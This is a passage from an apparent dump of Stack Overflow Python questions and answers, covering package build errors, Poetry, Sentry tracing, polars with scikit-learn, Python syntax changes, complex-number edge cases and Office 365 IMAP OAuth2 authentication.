        File &quot;/Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/3.8/lib/python3.8/site-packages/setuptools/build_meta.py&quot;, line 142, in run_setup
          exec(compile(code, __file__, 'exec'), locals())
        File &quot;setup.py&quot;, line 2, in &lt;module&gt;
          from setuptools_rust import Binding, RustExtension
        File &quot;/private/var/folders/bg/ncfh283n4t39vqhvbd5n9ckh0000gn/T/pip-build-env-vjj6eow8/overlay/lib/python3.8/site-packages/setuptools_rust/__init__.py&quot;, line 1, in &lt;module&gt;
          from .build import build_rust
        File &quot;/private/var/folders/bg/ncfh283n4t39vqhvbd5n9ckh0000gn/T/pip-build-env-vjj6eow8/overlay/lib/python3.8/site-packages/setuptools_rust/build.py&quot;, line 20, in &lt;module&gt;
          from setuptools.command.build import build as CommandBuild  # type: ignore[import]
      ModuleNotFoundError: No module named 'setuptools.command.build'
      [end of output]
  
  note: This error originates from a subprocess, and is likely not a problem with pip.
error: subprocess-exited-with-error

× Getting requirements to build wheel did not run successfully.
│ exit code: 1
╰─&gt; See above for output.

note: This error originates from a subprocess, and is likely not a problem with pip.
</code></pre>
<p>Can anybody tell me what I should do or what is wrong with what I am currently doing? I factory reset my Mac and re-downloaded everything but I still get this same error. I am stumped.</p>
","73868734","<p>I posted this as an issue to the actual Sentence Transformers GitHub page. Around 4 days ago I was given this answer by a &quot;Federico Viticci&quot; which resolved the issue and allowed me to finally install the library:</p>
<p>&quot;For what it is worth, I was having the exact issue. Installing it directly from source using</p>
<pre><code>pip install git+https://github.com/huggingface/transformers
</code></pre>
<p>fixed it on my M1 Max MacBook Pro.&quot;</p>
<p>Original Git Issue here:
<a href=""https://github.com/UKPLab/sentence-transformers/issues/1652"" rel=""nofollow noreferrer"">https://github.com/UKPLab/sentence-transformers/issues/1652</a></p>
"
"74398563","1","How to use polars dataframes with scikit-learn?","<p>I'm unable to use polars dataframes with scikitlearn for ML training.</p>
<p>Currently I'm doing all the dataframe preprocessing in polars and during model training i'm converting it into a pandas one in order for it to work.</p>
<p>Is there any method to directly use polars dataframe as it is for ML training without changing it to pandas?</p>
","74402124","<p>You must call <code>to_numpy</code> when passing a <code>DataFrame</code> to sklearn. Though sometimes <code>sklearn</code> can work on polars <code>Series</code> it is still good type hygiene to transform to the type the host library expects.</p>
<pre class=""lang-py prettyprint-override""><code>import polars as pl
from sklearn.linear_model import LinearRegression

data = pl.DataFrame(
    np.random.randn(100, 5)
)

x = data.select([
    pl.all().exclude(&quot;column_0&quot;),
])

y = data.select(pl.col(&quot;column_0&quot;).alias(&quot;y&quot;))


x_train = x[:80]
y_train = y[:80]

x_test = x[80:]
y_test = y[80:]


m = LinearRegression()

m.fit(X=x_train.to_numpy(), y=y_train.to_numpy())
m.predict(x_test.to_numpy())
</code></pre>
"
"73876790","1","Poetry configuration is invalid - Additional properties are not allowed ('group' was unexpected)","<p>Recently, I faced this issue with Poetry. All my commands using poetry were failing with the following error.</p>
<pre><code>RuntimeError

  The Poetry configuration is invalid:
    - Additional properties are not allowed ('group' was unexpected)
</code></pre>
","73876791","<p>I figured out the following issue.</p>
<ol>
<li>The code owners had updated the poetry core requirement to <code>requires = [&quot;poetry-core&gt;=1.2.0&quot;]</code></li>
<li>My current poetry version was <code>1.1.12</code></li>
</ol>
<p>I did the following to fix my issue.</p>
<pre><code># remove the current poetry installation
rm -rf /Users/myusername/.poetry

# upgrade poetry version
pip install poetry -U
</code></pre>
<p>This should solve the problem. I verified the same by running my other poetry commands.</p>
<blockquote>
<p>It should be noted that your current poetry configurations will be lost while doing this, and would need to be recreated and reinstalled.</p>
</blockquote>
<pre><code># reinstall poetry for my project
poetry install
</code></pre>
"
"74454587","1","sentry sdk custom performance integration for python app","<p>Sentry can track performance for celery tasks and API endpoints
<a href=""https://docs.sentry.io/product/performance/"" rel=""noreferrer"">https://docs.sentry.io/product/performance/</a></p>
<p>I have custom script that are lunching by crone and do set of similar <em><strong>tasks</strong></em></p>
<p>I want to incorporated sentry_sdk into my script to get performance tracing of my <em><strong>tasks</strong></em></p>
<p>Any advise how to do it with
<a href=""https://getsentry.github.io/sentry-python/api.html#sentry_sdk.capture_event"" rel=""noreferrer"">https://getsentry.github.io/sentry-python/api.html#sentry_sdk.capture_event</a></p>
","74481555","<p>You don't need use <code>capture_event</code><br />
I would suggest to use <code>sentry_sdk.start_transaction</code> instead. It also allows track your function performance.</p>
<p>Look at my example</p>
<pre><code>from time import sleep
from sentry_sdk import Hub, init, start_transaction

init(
    dsn=&quot;dsn&quot;,
    traces_sample_rate=1.0,
)


def sentry_trace(func):
    def wrapper(*args, **kwargs):
        transaction = Hub.current.scope.transaction
        if transaction:
            with transaction.start_child(op=func.__name__):
                return func(*args, **kwargs)
        else:
            with start_transaction(op=func.__name__, name=func.__name__):
                return func(*args, **kwargs)

    return wrapper


@sentry_trace
def b():
    for i in range(1000):
        print(i)


@sentry_trace
def c():
    sleep(2)
    print(1)


@sentry_trace
def a():
    sleep(1)
    b()
    c()


if __name__ == '__main__':
    a()
</code></pre>
<p>After starting this code you can see basic info of transaction <code>a</code> with childs <code>b</code> and <code>c</code>
<a href=""https://i.stack.imgur.com/7dR5r.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/7dR5r.png"" alt=""enter image description here"" /></a></p>
"
"74556349","1","No module named 'huggingface_hub.snapshot_download'","<p>When I try to run the <a href=""https://github.com/yangkevin2/emnlp22-re3-story-generation#quick-start-with-notebook"" rel=""noreferrer"">quick start notebook</a> of <a href=""https://github.com/yangkevin2/emnlp22-re3-story-generation"" rel=""noreferrer"">this repo</a>, I get the error <code>ModuleNotFoundError: No module named 'huggingface_hub.snapshot_download'</code>. How can I fix it? I already installed <code>huggingface_hub</code> using pip.</p>
<p>I get the error after compiling the following cell:</p>
<pre><code>!CUDA_VISIBLE_DEVICES=0 python -u ../scripts/main.py --summarizer gpt3_summarizer --controller longformer_classifier longformer_classifier --loader alignment coherence --controller-load-dir emnlp22_re3_data/ckpt/relevance_reranker emnlp22_re3_data/ckpt/coherence_reranker --controller-model-string allenai/longformer-base-4096 allenai/longformer-base-4096 --save-outline-file output/outline0.pkl --save-complete-file output/complete_story0.pkl --log-file output/story0.log
</code></pre>
<p>Here's the entire output:</p>
<pre><code>Traceback (most recent call last):
  File &quot;../scripts/main.py&quot;, line 20, in &lt;module&gt;
    from story_generation.edit_module.entity import *
  File &quot;/home/jovyan/emnlp22-re3-story-generation/story_generation/edit_module/entity.py&quot;, line 20, in &lt;module&gt;
    from story_generation.common.util import *
  File &quot;/home/jovyan/emnlp22-re3-story-generation/story_generation/common/util.py&quot;, line 13, in &lt;module&gt;
    from sentence_transformers import SentenceTransformer
  File &quot;/opt/conda/lib/python3.8/site-packages/sentence_transformers/__init__.py&quot;, line 3, in &lt;module&gt;
    from .datasets import SentencesDataset, ParallelSentencesDataset
  File &quot;/opt/conda/lib/python3.8/site-packages/sentence_transformers/datasets/__init__.py&quot;, line 3, in &lt;module&gt;
    from .ParallelSentencesDataset import ParallelSentencesDataset
  File &quot;/opt/conda/lib/python3.8/site-packages/sentence_transformers/datasets/ParallelSentencesDataset.py&quot;, line 4, in &lt;module&gt;
    from .. import SentenceTransformer
  File &quot;/opt/conda/lib/python3.8/site-packages/sentence_transformers/SentenceTransformer.py&quot;, line 25, in &lt;module&gt;
    from .evaluation import SentenceEvaluator
  File &quot;/opt/conda/lib/python3.8/site-packages/sentence_transformers/evaluation/__init__.py&quot;, line 5, in &lt;module&gt;
    from .InformationRetrievalEvaluator import InformationRetrievalEvaluator
  File &quot;/opt/conda/lib/python3.8/site-packages/sentence_transformers/evaluation/InformationRetrievalEvaluator.py&quot;, line 6, in &lt;module&gt;
    from ..util import cos_sim, dot_score
  File &quot;/opt/conda/lib/python3.8/site-packages/sentence_transformers/util.py&quot;, line 407, in &lt;module&gt;
    from huggingface_hub.snapshot_download import REPO_ID_SEPARATOR
ModuleNotFoundError: No module named 'huggingface_hub.snapshot_download'
</code></pre>
","74573811","<p>Updating to the latest version of <code>sentence-transformers</code> fixes it (no need to install <code>huggingface-hub</code> explicitly):</p>
<pre><code>pip install -U sentence-transformers
</code></pre>
<p>I've proposed <a href=""https://github.com/yangkevin2/emnlp22-re3-story-generation/pull/5"" rel=""noreferrer"">a pull request</a> for this in the original repo.</p>
"
"74660176","1","Using VisualStudio+ Python -- how to handle ""overriding stdlib module"" Pylance(reportShadowedImports) warning?","<p>When running ipynbs in VS Code, I've started noticing Pylance warnings on standard library imports. I am using a conda virtual environment, and I believe the warning is related to that. An example using the glob library reads:</p>
<p><code> &quot;env\Lib\glob.py&quot; is overriding the stdlib &quot;glob&quot; modulePylance(reportShadowedImports)</code></p>
<p>So far my notebooks run as expected, but I am curious if this warning is indicative of poor layout or is just stating the obvious more of an &quot;FYI you are not using the base install of python&quot;.</p>
<p>I have turned off linting and the problem stills persists. And almost nothing returns from my searches of the error &quot;reportShadowedImports&quot;.</p>
","74675579","<p>The reason you find nothing by searching is because this check has just been implemented recently (see <a href=""https://github.com/microsoft/pyright/pull/4132"" rel=""noreferrer"">Github</a>). I ran into the same problem as you because <code>code.py</code> from Micropython/Circuitpython also overrides the module &quot;code&quot; in stdlib.</p>
<p>The solution is simple, though you then loose out on this specific check. Just add <code>reportShadowedImports</code> to your <a href=""https://github.com/microsoft/pyright/blob/main/docs/configuration.md#reportShadowedImports"" rel=""noreferrer"">pyright config</a>. For VS Code, that would be adding it to <code>.vscode/settings.json</code>:</p>
<pre><code>{
  &quot;python.languageServer&quot;: &quot;Pylance&quot;,
  [...]
  &quot;python.analysis.diagnosticSeverityOverrides&quot;: {
      &quot;reportShadowedImports&quot;: &quot;none&quot;
  },
  [...]
}
</code></pre>
"
"73888639","1","Why is this unpacking expression not allowed in python3.10?","<p>I used to unpack a long iterable expression like this:</p>
<p>In python 3.8.7:</p>
<pre class=""lang-py prettyprint-override""><code>&gt;&gt;&gt; _, a, (*_), c = [1,2,3,4,5,6]
&gt;&gt;&gt; a
2
&gt;&gt;&gt; c
6
</code></pre>
<p>In python 3.10.7:</p>
<pre class=""lang-py prettyprint-override""><code>&gt;&gt;&gt; _, a, (*_), c = [1,2,3,4,5,6]
  File &quot;&lt;stdin&gt;&quot;, line 1
    _, a, (*_), c = [1,2,3,4,5,6]
           ^^
SyntaxError: cannot use starred expression here
</code></pre>
<p>I'm not sure which version of python between 3.8.7 and 3.10.7 introduced this backwards breaking behavior. What's the justification for this?</p>
","73888752","<p>There's an official discussion <a href=""https://bugs.python.org/issue40631"" rel=""nofollow noreferrer"">here</a>. The most relevant quote I can find is:</p>
<blockquote>
<blockquote>
<p>Also the current behavior allows <code>(*x), y = 1</code> assignment. If <code>(*x)</code> is to be totally disallowed, <code>(*x), y = 1</code> should also be rejected.</p>
</blockquote>
</blockquote>
<blockquote>
<p>I agree.</p>
</blockquote>
<p>The final &quot;I agree&quot; is from Guido van Rossum.</p>
<p>The rationale for rejecting <code>(*x)</code> was:</p>
<blockquote>
<p>Honestly this seems like a bug in 3.8 to me (if it indeed behaves like
this):</p>
<pre><code>&gt;&gt;&gt; (*x), y (1, 2, 3)
</code></pre>
<p>Every time I mistakenly tried (*x) I really meant (*x,), so it's
surprising that (*x), y would be interpreted as (*x, y) rather than
flagging (*x) as an error.</p>
<p>Please don't &quot;fix&quot; this even if it is a regression.</p>
</blockquote>
<p>Also by Guido van Rossum. So it seems like <code>(*x)</code> was rejected because it looks too similar to unpacking into a singlet tuple.</p>
"
"74583630","1","Why is Python saying modules are imported when they are not?","<p>Python 3.6.5</p>
<p>Using <a href=""https://stackoverflow.com/a/30483269/20607842"">this answer</a> as a guide, I attempted to see whether some modules, such as <code>math</code> were imported.</p>
<p>But Python tells me they are all imported when they are not.</p>
<pre><code>&gt;&gt;&gt; import sys
&gt;&gt;&gt; 'math' in sys.modules
True
&gt;&gt;&gt; 'math' not in sys.modules
False
&gt;&gt;&gt; math.pi
Traceback (most recent call last):
  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
NameError: name 'math' is not defined
&gt;&gt;&gt; import math
&gt;&gt;&gt; 'math' in sys.modules
True
&gt;&gt;&gt; math.pi
3.141592653589793
</code></pre>
","74583684","<p>to explain this, let's define this function:</p>
<pre class=""lang-py prettyprint-override""><code>def import_math():
    import math

import_math()
</code></pre>
<p>the above function will import the module math, but only in its local scope, anyone that tries to reference <code>math</code> outside of it will get a name error, because <code>math</code> is not defined in the global scope.</p>
<p>any module that is imported is saved into sys.modules so a call to check</p>
<pre class=""lang-py prettyprint-override""><code>import_math()
print(&quot;math&quot; in sys.modules)
</code></pre>
<p>will print True, because sys.modules caches any module that is loaded anywhere, whether or not it was available in the global scope, a very simple way to define <code>math</code> in the global scope would then to</p>
<pre class=""lang-py prettyprint-override""><code>import_math()
math = sys.modules[&quot;math&quot;]
</code></pre>
<p>which will convert it from being only in <code>sys.modules</code> to being in the global scope, this is just equivalent to</p>
<pre class=""lang-py prettyprint-override""><code>import math
</code></pre>
<p>which defines a variable <code>math</code> in the global scope that points to the module <code>math</code>.</p>
<p>now if you want to see whether &quot;math&quot; exists in the global scope is to check if it is in the global scope directly.</p>
<pre class=""lang-py prettyprint-override""><code>print(&quot;math&quot; in globals())
print(&quot;math&quot; in locals())
</code></pre>
<p>which will print false if &quot;math&quot; wasn't imported into the global or local scope and is therefore inaccessable.</p>
"
"74508024","1","Is requirements.txt still needed when using pyproject.toml?","<p>Since mid 2022 it is now possible to get rid of <code>setup.py</code>, <code>setup.cfg</code> in favor of <code>pyproject.toml</code>. Editable installs work with recent versions of setuptools and pip and even the official <a href=""https://packaging.python.org/en/latest/tutorials/packaging-projects/"" rel=""noreferrer"">packaging tutorial</a> switched away from <code>setup.py</code> to <code>pyproject.toml</code>.</p>
<p>However, documentation regarding <code>requirements.txt</code> seems to be have been also removed, and I wonder where to put the <strong>pinned requirements</strong> now?</p>
<p>As a refresher: It used to be common practice to put the dependencies (without version pinning) in <code>setup.py</code> avoiding issues when this package gets installed with other packages needing the same dependencies but with conflicting version requirements. For packaging libraries a <code>setup.py</code> was usually sufficient.</p>
<p>For deployments (i.e. non libraries) you usually also provided a <code>requirements.txt</code> with version-pinned dependencies. So you don't accidentally get the latest and greatest but the exact versions of dependencies that that package has been tested with.</p>
<p>So my question is, did anything change? Do you still put the pinned requirements in the <code>requirements.txt</code> when used together with <code>pyproject.toml</code>? Or is there an extra section
for that in <code>pyproject.toml</code>? Is there some documentation on that somewhere?</p>
","74625055","<p>Quoting myself from <a href=""https://github.com/pypa/packaging.python.org/issues/685#issuecomment-1321616748"" rel=""nofollow noreferrer"">here</a></p>
<blockquote>
<p>My current assumption is: [...] you put your (mostly unpinned) dependencies to pyproject.toml instead of setup.py, so you library can be installed as a dependency of something else without causing much troubles because of issues resolving version constraints.</p>
</blockquote>
<blockquote>
<p>On top of that, for &quot;deployable applications&quot; (for lack of a better term), you still want to maintain a separate requirements.txt with exact version pinning.</p>
</blockquote>
<p>Which has been confirmed by a Python Packaging Authority (PyPA) member and clarification of PyPA's recommendations should be updated accordingly at some point.</p>
"
"71319523","1","Django rest framework drf-yasg swagger multiple file upload error for ListField serializer","<p>I am trying to make upload file input from <em>swagger</em> (with <code>drf-yasg</code>), but when I use <strong><code>MultiPartParser</code></strong> class it gives me the below error:</p>
<pre><code>drf_yasg.errors.SwaggerGenerationError: FileField is supported only in a formData Parameter or response Schema
</code></pre>
<p>My view:</p>
<pre class=""lang-py prettyprint-override""><code>class AddExperience(generics.CreateAPIView):
    parser_classes = [MultiPartParser]

    permission_classes = [IsAuthenticated]
    serializer_class = DoctorExperienceSerializer
</code></pre>
<p>My serializer:</p>
<pre class=""lang-py prettyprint-override""><code>class DoctorExperienceSerializer(serializers.Serializer):
    diploma = serializers.ListField(
        child=serializers.FileField(allow_empty_file=False)
    )
    education = serializers.CharField(max_length=1000)
    work_experience = serializers.CharField(max_length=1000)
</code></pre>
<p>I also tried <code>FormParser</code> but it still gives me the same error. Also: <code>FileUploadParser</code> parser but it works like <code>JsonParser</code>:</p>
","74684163","<p>The <code>OpenAPISchema</code> (<code>OAS</code>) 2 doesn't support the multiple file upload (see issue <a href=""https://github.com/OAI/OpenAPI-Specification/issues/254"" rel=""nofollow noreferrer"">#254</a>); but <code>OAS 3</code> supports it (you can use <a href=""https://pastebin.com/Evs3m0ht"" rel=""nofollow noreferrer"">this YML spec</a> on a <a href=""https://editor.swagger.io/"" rel=""nofollow noreferrer"">live swagger editer</a> (<a href=""https://i.stack.imgur.com/CByFf.png"" rel=""nofollow noreferrer"">see this result</a>)).</p>
<p>Comes to the real issue, <a href=""https://drf-yasg.readthedocs.io/en/stable/readme.html#openapi-3-0-note"" rel=""nofollow noreferrer"">there is a section in the drf-yasg's doc</a>,</p>
<blockquote>
<p>If you are looking to add Swagger/OpenAPI support to a new project you might want to take a look at drf-spectacular, which is an actively maintained new library that shares most of the goals of this project, while working with OpenAPI 3.0 schemas.</p>
<p>OpenAPI 3.0 provides a lot more flexibility than 2.0 in the types of API that can be described. drf-yasg is unlikely to soon, if ever, get support for OpenAPI 3.0.</p>
</blockquote>
<p>That means the package <code>drf-yasg</code> doesn't have support for <code>OAS3</code> and thus, it won't support the <em>&quot;multiple file upload&quot;</em> feature.</p>
<p>You can consider migrating from <code>drf-yasg</code> to <a href=""https://drf-spectacular.readthedocs.io/"" rel=""nofollow noreferrer""><code>drf-spectacular</code></a>. But, also note that, <code>drf-spectacular</code> is also dealing the FileUpload in <a href=""https://drf-spectacular.readthedocs.io/en/latest/faq.html#filefield-imagefield-is-not-handled-properly-in-the-schema"" rel=""nofollow noreferrer"">a different way</a>.</p>
"
"74067547","1","Could not find poetry-1.2.2-linux.sha256sum file","<p>I am trying to update my version of Poetry to 1.2.*, but when running <code>poetry self update</code> I get the error <code>Could not find poetry-1.2.2-linux.sha256sum file</code>... I can't figure out how to try and update Poetry to an earlier version for which hopefully the checksum exists.</p>
","74067692","<p>You are trying to update a Poetry that was installed with the <code>get-poetry.py</code> installer. This installer is deprecated for more than a year now. Updating via <code>poetry self update</code> is not possible for these installation. Uninstall Poetry and reinstall with the recommended installer.</p>
<p>More information are available at <a href=""https://python-poetry.org/blog/announcing-poetry-1.2.0/"" rel=""noreferrer"">https://python-poetry.org/blog/announcing-poetry-1.2.0/</a></p>
"
"74798626","1","Why is log(inf + inf j) equal to (inf + 0.785398 j), In C++/Python/NumPy?","<p>I've been finding a strange behaviour of <code>log</code> functions in C++ and numpy about the behaviour of <code>log</code> function handling complex infinite numbers. Specifically, <code>log(inf + inf * 1j)</code> equals <code>(inf + 0.785398j)</code> when I expect it to be <code>(inf + nan * 1j)</code>.</p>
<p>When taking the log of a complex number, the real part is the log of the absolute value of the input and the imaginary part is the phase of the input. Returning 0.785398 as the imaginary part of <code>log(inf + inf * 1j)</code> means it assumes the <code>inf</code>s in the real and the imaginary part have the same length.
This assumption does not seem to be consistent with other calculation, for example, <code>inf - inf == nan</code>, <code>inf / inf == nan</code> which assumes 2 <code>inf</code>s do not necessarily have the same values.</p>
<p>Why is the assumption for <code>log(inf + inf * 1j)</code> different?</p>
<p>Reproducing C++ code:</p>
<pre><code>#include &lt;complex&gt;
#include &lt;limits&gt;
#include &lt;iostream&gt;
int main() {
    double inf = std::numeric_limits&lt;double&gt;::infinity();
    std::complex&lt;double&gt; b(inf, inf);
    std::complex&lt;double&gt; c = std::log(b);
    std::cout &lt;&lt; c &lt;&lt; &quot;\n&quot;;
}
</code></pre>
<p>Reproducing Python code (numpy):</p>
<pre><code>import numpy as np

a = complex(float('inf'), float('inf'))
print(np.log(a))
</code></pre>
<p>EDIT: Thank you for everyone who's involved in the discussion about the historical reason and the mathematical reason. All of you turn this naive question into a really interesting discussion. The provided answers are all of high quality and I wish I can accept more than 1 answers. However, I've decided to accept @simon's answer as it explains in more detail the mathematical reason and provided a link to the document explaining the logic (although I can't fully understand it).</p>
","74799453","<p>The value of 0.785398 (actually pi/4) is consistent with at least <em>some</em> other functions: as you said, the imaginary part of the logarithm of a complex number is identical with the phase angle of the number. This can be reformulated to a question of its own: what is the phase angle of <code>inf + j * inf</code>?</p>
<p>We can calculate the phase angle of a complex number <code>z</code> by <code>atan2(Im(z), Re(z))</code>. With the given number, this boils down to calculating <code>atan2(inf, inf)</code>, which is also 0.785398 (or pi/4), both for Numpy and C/C++. So now a similar question could be asked: why is <code>atan2(inf, inf) == 0.785398</code>?</p>
<p>I do not have an answer to the latter (except for &quot;the C/C++ specifications say so&quot;, as others already answered), I only have a guess: as <code>atan2(y, x) == atan(y / x)</code> for <code>x &gt; 0</code>, probably someone made the decision in this context to not interpret <code>inf / inf</code> as &quot;undefined&quot; but instead as &quot;a very large number divided by the same very large number&quot;. The result of this ratio would be 1, and <code>atan(1) == pi/4</code> by the mathematical definition of <code>atan</code>.</p>
<p>Probably this is not a satisfying answer, but at least I could hopefully show that the <code>log</code> definition in the given edge case is not completely inconsistent with similar edge cases of related function definitions.</p>
<p><strong>Edit</strong>: As I said, consistent with <em>some</em> other functions: it is also consistent with <code>np.angle(complex(np.inf, np.inf)) == 0.785398</code>, for example.</p>
<p><strong>Edit 2</strong>: Looking at the <a href=""https://opensource.apple.com/source/Libm/Libm-93/ppc.subproj/atan2.c.auto.html"" rel=""noreferrer"">source code of an actual <code>atan2</code> implementation</a> brought up the following code comment:</p>
<blockquote>
<p>note that the non obvious cases are y and x both infinite or both zero. for more information, see <em>Branch Cuts for Complex Elementary Functions, or Much Ado About Nothing's Sign Bit</em>, by W. Kahan</p>
</blockquote>
<p>I dug up the referenced document, you can find a copy <a href=""https://people.freebsd.org/%7Edas/kahan86branch.pdf"" rel=""noreferrer"">here</a>. In Chapter 8 of this reference, called &quot;Complex zeros and infinities&quot;, <a href=""https://en.wikipedia.org/wiki/William_Kahan"" rel=""noreferrer"">William Kahan</a> (who is both mathematician and computer scientist and, according to Wikipedia, the &quot;Father of Floating Point&quot;) covers the zero and infinity edge cases of complex numbers and arrives at pi/4 for feeding <code>inf + j * inf</code> into the <code>arg</code> function (<code>arg</code> being the function that calculates the phase angle of a complex number, just like <code>np.angle</code> above). You will find this result on page 17 in the linked PDF. I am not mathematician enough for being able to summarize Kahan's rationale (which is to say: I don't really understand it), but maybe someone else can.</p>
"
"74012595","1","Why does code that in 3.10 throws a RecursionError as expected not throw in earlier versions?","<p>To start I tried this</p>
<pre><code>def x():
   try:
      1/0 # just an division error to get an exception
   except:
      x()
</code></pre>
<p>And this code behaves normally in 3.10 and I get <code>RecursionError: maximum recursion depth exceeded</code> as I expected but 3.8 goes into a stack overflow and doesn't handle the recursion error properly. But I did remember that there was <code>RecursionError</code> in older versions of Python too, so I tried</p>
<pre><code>def x(): x()
</code></pre>
<p>And this gives back <code>RecursionError</code> in both versions of Python.</p>
<p>It's as if (in the first snippet) the recursion error is never thrown in the except but the function called and then the error thrown at the first instruction of the function called but handled by the try-except.</p>
<p>I then tried something else:</p>
<pre><code>def x():
   try:
      x()
   except:
      x()
</code></pre>
<p>This is even weirder in some way, stack overflow below 3.10 but it get stuck in the loop in 3.10</p>
<p>Can you explain this behavior?</p>
<p>UPDATE
@MisterMiyagi found a even stranger behavior, adding a statement in the except in <code>&lt;=python3.9</code> doesn't result in a stackoverflow</p>
<pre><code>def x():
   try:
      1/0
   except:
      print(&quot;&quot;)
      x()
</code></pre>
","74073476","<p>The different behaviors for 3.10 and other versions seem to be because of a Python issue (<a href=""https://github.com/python/cpython/issues/86666"" rel=""noreferrer"">python/cpython#86666</a>), you can also see the correct error on Python 2.7.</p>
<p>The print &quot;fixes&quot; things because it makes Python check the recursion limit again, and through a path that is presumably not broken. You can see the code where it does that <a href=""https://github.com/python/cpython/blob/157a8b8edda05ce54852429b3ee8dfc58c3c562e/Objects/call.c#L251-L287"" rel=""noreferrer"">here</a>, it also skips the repeated check if the object supports the Vectorcall calling protocol, so things like <code>int</code> keep the fatal error.</p>
"
"73902642","1","Office 365 IMAP authentication via OAuth2 and python MSAL library","<p>I'm trying to upgrade a legacy mail bot to authenticate via Oauth2 instead of Basic authentication, as it's <a href=""https://learn.microsoft.com/en-us/exchange/clients-and-mobile-in-exchange-online/deprecation-of-basic-authentication-exchange-online"" rel=""noreferrer"">now deprecated two days from now</a>.</p>
<p>The document states applications can retain their original logic, while swapping out only the authentication bit</p>
<blockquote>
<p>Application developers who have built apps that send, read, or
otherwise process email using these protocols will be able to keep the
same protocol, but need to implement secure, Modern authentication
experiences for their users. This functionality is built on top of
Microsoft Identity platform v2.0 and supports access to Microsoft 365
email accounts.</p>
</blockquote>
<p>Note I've explicitly chosen the <a href=""https://learn.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-client-creds-grant-flow"" rel=""noreferrer"">client credentials flow</a>, because the documentation states</p>
<blockquote>
<p>This type of grant is commonly used for server-to-server interactions
that must run in the background, without immediate interaction with a
user.</p>
</blockquote>
<p>So I've got a python script that retrieves an Access Token using the <a href=""https://github.com/AzureAD/microsoft-authentication-library-for-python"" rel=""noreferrer"">MSAL python library</a>. Now I'm trying to authenticate with the IMAP server, using that Access Token. There's some existing threads out there showing how to connect to Google, I imagine my case is pretty close to <a href=""https://stackoverflow.com/q/5193707/680920"">this one</a>, except I'm connecting to a Office 365 IMAP server. Here's my script</p>
<pre class=""lang-py prettyprint-override""><code>import imaplib
import msal
import logging

app = msal.ConfidentialClientApplication(
    'client-id',
    authority='https://login.microsoftonline.com/tenant-id',
    client_credential='secret-key'
)

result = app.acquire_token_for_client(scopes=['https://graph.microsoft.com/.default'])

def generate_auth_string(user, token):
  return 'user=%s\1auth=Bearer %s\1\1' % (user, token)

# IMAP time!
mailserver = 'outlook.office365.com'
imapport = 993
M = imaplib.IMAP4_SSL(mailserver,imapport)
M.debug = 4
M.authenticate('XOAUTH2', lambda x: generate_auth_string('user@mydomain.com', result['access_token']))

print(result)
</code></pre>
<p>The IMAP authentication is failing and despite setting <code>M.debug = 4</code>, the output isn't very helpful</p>
<pre><code>  22:56.53 &gt; b'DBDH1 AUTHENTICATE XOAUTH2'
  22:56.53 &lt; b'+ '
  22:56.53 write literal size 2048
  22:57.84 &lt; b'DBDH1 NO AUTHENTICATE failed.'
  22:57.84 NO response: b'AUTHENTICATE failed.'
Traceback (most recent call last):
  File &quot;/home/ubuntu/mini-oauth.py&quot;, line 21, in &lt;module&gt;
    M.authenticate(&quot;XOAUTH2&quot;, lambda x: generate_auth_string('user@mydomain.com', result['access_token']))
  File &quot;/usr/lib/python3.10/imaplib.py&quot;, line 444, in authenticate
    raise self.error(dat[-1].decode('utf-8', 'replace'))
imaplib.IMAP4.error: AUTHENTICATE failed.
</code></pre>
<p>Any idea where I might be going wrong, or how to get more robust information from the IMAP server about why the authentication is failing?</p>
<p><strong>Things I've looked at</strong></p>
<ul>
<li><p>Note <a href=""https://stackoverflow.com/a/60773366/680920"">this answer</a> no longer works as the suggested scopes fail to generate an Access Token.</p>
</li>
<li><p>The client credentials flow seems to <a href=""https://learn.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-client-creds-grant-flow#first-case-access-token-request-with-a-shared-secret"" rel=""noreferrer"">mandate the <code>https://graph.microsoft.com/.default</code> grant</a>. I'm not sure if that includes the <a href=""https://learn.microsoft.com/en-us/exchange/client-developer/legacy-protocols/how-to-authenticate-an-imap-pop-smtp-application-by-using-oauth#get-an-access-token"" rel=""noreferrer"">scope required for the IMAP resource</a>
<code>https://outlook.office.com/IMAP.AccessAsUser.All</code>?</p>
</li>
<li><p>Verified the code lifted from the Google thread produces the SASL XOAUTH2 string correctly, per <a href=""https://learn.microsoft.com/en-us/exchange/client-developer/legacy-protocols/how-to-authenticate-an-imap-pop-smtp-application-by-using-oauth#sasl-xoauth2"" rel=""noreferrer"">example on the MS docs</a></p>
</li>
</ul>
<pre><code>import base64

user = 'test@contoso.onmicrosoft.com'
token = 'EwBAAl3BAAUFFpUAo7J3Ve0bjLBWZWCclRC3EoAA'

xoauth = &quot;user=%s\1auth=Bearer %s\1\1&quot; % (user, token)

xoauth = xoauth.encode('ascii')
xoauth = base64.b64encode(xoauth)
xoauth = xoauth.decode('ascii')

xsanity = 'dXNlcj10ZXN0QGNvbnRvc28ub25taWNyb3NvZnQuY29tAWF1dGg9QmVhcmVyIEV3QkFBbDNCQUFVRkZwVUFvN0ozVmUwYmpMQldaV0NjbFJDM0VvQUEBAQ=='

print(xoauth == xsanity) # prints True
</code></pre>
<ul>
<li><a href=""https://stackoverflow.com/questions/61597263/office-365-xoauth2-for-imap-and-smtp-authentication-fails"">This thread</a> seems to suggest multiple tokens need to be fetched, one for graph, then another for the IMAP connection; could that be what I'm missing?</li>
</ul>
","74131277","<p>The <code>imaplib.IMAP4.error: AUTHENTICATE failed</code> Error occured because one point in the documentation is not that clear.</p>
<p>When setting up the the Service Principal via Powershell you need to enter the App-ID and an Object-ID. Many people will think, it is the Object-ID you see on the overview page of the registered App, but its not!
At this point you need the Object-ID from <strong>&quot;Azure Active Directory -&gt; Enterprise Applications --&gt; Your-App --&gt; Object-ID&quot;</strong></p>
<pre><code>New-ServicePrincipal -AppId &lt;APPLICATION_ID&gt; -ServiceId &lt;OBJECT_ID&gt; [-Organization &lt;ORGANIZATION_ID&gt;]
</code></pre>
<p>Microsoft says:</p>
<blockquote>
<p>The OBJECT_ID is the Object ID from the Overview page of the
Enterprise Application node (Azure Portal) for the application
registration. It is not the Object ID from the Overview of the App
Registrations node. Using the incorrect Object ID will cause an
authentication failure.</p>
</blockquote>
<p>Ofcourse you need to take care for the API-permissions and the other stuff, but this was for me the point.
So lets go trough it again, like it is explained on the documentation page.
